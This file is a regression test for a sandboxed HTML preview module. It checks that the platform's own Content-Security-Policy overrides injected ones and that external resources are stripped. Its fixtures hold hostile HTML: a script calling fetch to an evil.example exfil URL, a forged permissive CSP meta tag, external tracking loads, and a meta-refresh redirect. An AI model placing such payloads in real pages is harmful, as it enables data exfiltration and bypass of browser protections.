/**
 * R-001 regression: platform owns final CSP for untrusted HTML previews.
 * Dependency-free Node runner with a minimal DOMParser sufficient for the module.
 */
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const sourcePath = join(__dirname, "sandboxed-html-preview.ts");
const source = readFileSync(sourcePath, "utf8");

assert.match(source, /DOMParser/);
assert.match(source, /querySelectorAll\("meta\[http-equiv\]"\)/);
assert.match(source, /content-security-policy/);
assert.match(source, /connect-src 'none'/);
assert.match(source, /iframe, object, embed, form, base, link/);
assert.match(source, /@import/);
assert.doesNotMatch(source, /html\.replace\([^\n]*Content-Security-Policy/i);

class AttrMap extends Map {
  get(name) {
    return super.get(String(name).toLowerCase()) ?? null;
  }
  set(name, value) {
    return super.set(String(name).toLowerCase(), String(value));
  }
  has(name) {
    return super.has(String(name).toLowerCase());
  }
  delete(name) {
    return super.delete(String(name).toLowerCase());
  }
}

function createNode(tagName) {
  const node = {
    tagName: tagName ? tagName.toUpperCase() : undefined,
    nodeType: tagName ? 1 : 3,
    attributes: new AttrMap(),
    childNodes: [],
    parentNode: null,
    _text: "",
    get textContent() {
      if (this.nodeType === 3) return this._text;
      return this.childNodes.map((child) => child.textContent).join("");
    },
    set textContent(value) {
      if (this.nodeType === 3) {
        this._text = String(value);
        return;
      }
      this.childNodes = [];
      const text = createNode(null);
      text._text = String(value);
      text.parentNode = this;
      this.childNodes.push(text);
    },
    getAttribute(name) {
      return this.attributes.get(name);
    },
    setAttribute(name, value) {
      this.attributes.set(name, value);
    },
    removeAttribute(name) {
      this.attributes.delete(name);
    },
    remove() {
      if (!this.parentNode) return;
      this.parentNode.childNodes = this.parentNode.childNodes.filter((child) => child !== this);
      this.parentNode = null;
    },
    querySelectorAll(selector) {
      return queryAll(this, selector);
    },
  };
  return node;
}

function parseSelectorList(selector) {
  return selector.split(",").map((part) => part.trim());
}

function matchOne(node, selector) {
  if (node.nodeType !== 1) return false;
  if (selector === "*") return true;
  const attrMatch = selector.match(/^([a-z0-9-]*)\[([a-z0-9:_-]+)\]$/i);
  if (attrMatch) {
    const [, tag, attr] = attrMatch;
    if (tag && node.tagName !== tag.toUpperCase()) return false;
    return node.attributes.has(attr);
  }
  return node.tagName === selector.toUpperCase();
}

function match(node, selector) {
  return parseSelectorList(selector).some((part) => matchOne(node, part));
}

function walk(node, visit) {
  visit(node);
  for (const child of [...node.childNodes]) walk(child, visit);
}

function queryAll(root, selector) {
  const out = [];
  walk(root, (node) => {
    if (match(node, selector)) out.push(node);
  });
  return out;
}

function parseAttrs(raw) {
  const attrs = new AttrMap();
  const re = /([^\s=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g;
  let m;
  while ((m = re.exec(raw || ""))) {
    attrs.set(m[1], m[2] ?? m[3] ?? m[4] ?? "");
  }
  return attrs;
}

function parseHtml(html) {
  const root = createNode("document");
  const stack = [root];
  const re = /<!--[\s\S]*?-->|<\/([a-zA-Z0-9:-]+)\s*>|<([a-zA-Z0-9:-]+)([^>]*)>|([^<]+)/g;
  const voidTags = new Set(["meta", "img", "br", "hr", "input", "link", "base", "embed", "source"]);
  let m;
  while ((m = re.exec(html))) {
    if (m[0].startsWith("<!--")) continue;
    if (m[1]) {
      while (stack.length > 1 && stack[stack.length - 1].tagName !== m[1].toUpperCase()) {
        stack.pop();
      }
      if (stack.length > 1) stack.pop();
      continue;
    }
    if (m[2]) {
      const el = createNode(m[2]);
      for (const [key, value] of parseAttrs(m[3])) el.setAttribute(key, value);
      const parent = stack[stack.length - 1];
      el.parentNode = parent;
      parent.childNodes.push(el);
      const selfClosing = m[0].endsWith("/>") || voidTags.has(m[2].toLowerCase());
      if (!selfClosing) stack.push(el);
      continue;
    }
    if (m[4]) {
      const text = createNode(null);
      text._text = m[4];
      text.parentNode = stack[stack.length - 1];
      stack[stack.length - 1].childNodes.push(text);
    }
  }
  return root;
}

function serialize(node) {
  if (!node) return "";
  if (node.nodeType === 3) return node._text;
  if (node.tagName === "DOCUMENT") return node.childNodes.map(serialize).join("");
  const tag = node.tagName.toLowerCase();
  const attrText = [...node.attributes.entries()]
    .map(([key, value]) => ` ${key}="${String(value).replaceAll('"', "&quot;")}"`)
    .join("");
  const voidTags = new Set(["meta", "img", "br", "hr", "input", "link", "base", "embed", "source"]);
  if (voidTags.has(tag)) return `<${tag}${attrText}>`;
  return `<${tag}${attrText}>${node.childNodes.map(serialize).join("")}</${tag}>`;
}

class DOMParser {
  parseFromString(html) {
    const root = parseHtml(html);
    const head = queryAll(root, "head")[0] || createNode("head");
    const body = queryAll(root, "body")[0] || createNode("body");
    if (!queryAll(root, "head")[0]) root.childNodes.unshift(head);
    if (!queryAll(root, "body")[0]) root.childNodes.push(body);
    Object.defineProperty(head, "innerHTML", {
      get() {
        return this.childNodes.map(serialize).join("");
      },
    });
    Object.defineProperty(body, "innerHTML", {
      get() {
        return this.childNodes.map(serialize).join("");
      },
    });
    return {
      head,
      body,
      querySelectorAll(selector) {
        return queryAll(root, selector);
      },
    };
  }
}

globalThis.DOMParser = DOMParser;

const jsSource = source
  .replace(/: string/g, "")
  .replace(/: HTMLElement/g, "")
  .replace(/: HTMLScriptElement/g, "")
  .replace(/export const /g, "const ")
  .replace(/export function /g, "function ")
  .replace(/querySelectorAll<[^>]+>/g, "querySelectorAll");

const moduleUrl = `data:text/javascript,${encodeURIComponent(
  `${jsSource}\nexport { SANDBOXED_HTML_PREVIEW_CSP, sandboxedHtmlPreviewDocument };`,
)}`;
const { SANDBOXED_HTML_PREVIEW_CSP, sandboxedHtmlPreviewDocument } = await import(moduleUrl);

function countCsp(html) {
  return (html.match(/http-equiv=["']?Content-Security-Policy/gi) || []).length;
}

{
  const malicious = `<!doctype html><html><head>
<meta http-equiv="Content-Security-Policy" content="default-src * ; connect-src https: http:">
</head><body><script>fetch('https://evil.example/exfil')</script></body></html>`;
  const out = sandboxedHtmlPreviewDocument(malicious);
  assert.equal(countCsp(out), 1);
  assert.match(out, new RegExp(SANDBOXED_HTML_PREVIEW_CSP.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  assert.doesNotMatch(out, /connect-src https/);
}

{
  const forged = `<html><head><!-- Content-Security-Policy --></head>
<body><img src="https://evil.example/pixel.png"><iframe src="https://evil.example"></iframe>
<link rel="stylesheet" href="https://evil.example/x.css">
<script src="https://evil.example/x.js"></script>
<style>@import url("https://evil.example/a.css"); body{background:url("https://evil.example/b.png")}</style>
</body></html>`;
  const out = sandboxedHtmlPreviewDocument(forged);
  assert.equal(countCsp(out), 1);
  assert.doesNotMatch(out, /https:\/\/evil\.example/);
  assert.doesNotMatch(out, /<iframe/i);
  assert.doesNotMatch(out, /<link/i);
  assert.doesNotMatch(out, /@import/i);
}

{
  const mixedCase = `<html><head><meta HTTP-EQUIV="content-security-policy" content="script-src *"></head>
<body><a href="https://lan.example">x</a><img src="data:image/png;base64,aa"></body></html>`;
  const out = sandboxedHtmlPreviewDocument(mixedCase);
  assert.equal(countCsp(out), 1);
  assert.match(out, /src="data:image\/png;base64,aa"/);
  assert.doesNotMatch(out, /href="https:\/\/lan\.example"/);
}

{
  const refresh = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example"></head><body>hi</body></html>`;
  const out = sandboxedHtmlPreviewDocument(refresh);
  assert.doesNotMatch(out, /http-equiv="refresh"/i);
  assert.equal(countCsp(out), 1);
}

console.log("sandboxed-html-preview CSP regressions: ok");
